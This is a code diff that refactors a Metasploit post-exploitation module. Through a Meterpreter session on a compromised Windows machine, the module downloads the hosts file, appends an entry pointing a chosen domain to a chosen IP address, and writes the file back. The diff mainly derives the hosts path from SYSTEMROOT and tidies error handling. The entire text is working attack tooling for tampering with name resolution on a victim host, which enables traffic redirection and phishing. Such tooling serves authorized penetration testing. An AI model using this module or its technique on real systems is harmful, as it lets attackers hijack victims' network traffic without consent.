@@ -31,41 +31,41 @@ class MetasploitModule < Msf::Post
               stdapi_fs_stat
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
         }
       )
     )
 
-    register_options(
-      [
-        OptString.new('DOMAIN', [ true, 'Domain name for host file manipulation.' ]),
-        OptString.new('IP', [ true, 'IP address to point domain name to.' ])
-      ]
-    )
+    register_options([
+      OptString.new('DOMAIN', [ true, 'Domain name for host file manipulation.' ]),
+      OptString.new('IP', [ true, 'IP address to point domain name to.' ])
+    ])
   end
 
   def run
-    if datastore['IP'].nil? || datastore['DOMAIN'].nil?
-      print_error('Please specify both DOMAIN and IP')
-      return
-    end
-
     ip = datastore['IP']
     hostname = datastore['DOMAIN']
 
-    # Get a temporary file path
+    if ip.blank? || hostname.blank?
+      fail_with(Failure::BadConfig, 'Please specify both DOMAIN and IP.')
+    end
+
+    hosts_file_path = session.sys.config.getenv('SYSTEMROOT') + '\\System32\\drivers\\etc\\hosts'
+
     meterp_temp = Tempfile.new('meterp')
     meterp_temp.binmode
     temp_path = meterp_temp.path
 
     begin
       # Download the remote file to the temporary file
-      client.fs.file.download_file(temp_path, 'C:\\WINDOWS\\System32\\drivers\\etc\\hosts')
+      client.fs.file.download_file(temp_path, hosts_file_path)
     rescue Rex::Post::Meterpreter::RequestError => e
-      # If the file doesn't exist, then it's okay.  Otherwise, throw the
-      # error.
-      if e.result != 2
-        raise $ERROR_INFO
-      end
+      # If the file doesn't exist, then it's okay.  Otherwise, throw the error
+      raise $ERROR_INFO unless e.result == 2
     end
 
     print_status("Inserting hosts file entry pointing #{hostname} to #{ip}..")
@@ -73,7 +73,7 @@ class MetasploitModule < Msf::Post
     hostsfile.write("\r\n#{ip}\t#{hostname}")
     hostsfile.close
 
-    client.fs.file.upload_file('C:\\WINDOWS\\System32\\drivers\\etc\\hosts', temp_path)
+    client.fs.file.upload_file(hosts_file_path, temp_path)
     print_good('Done!')
   end
 end
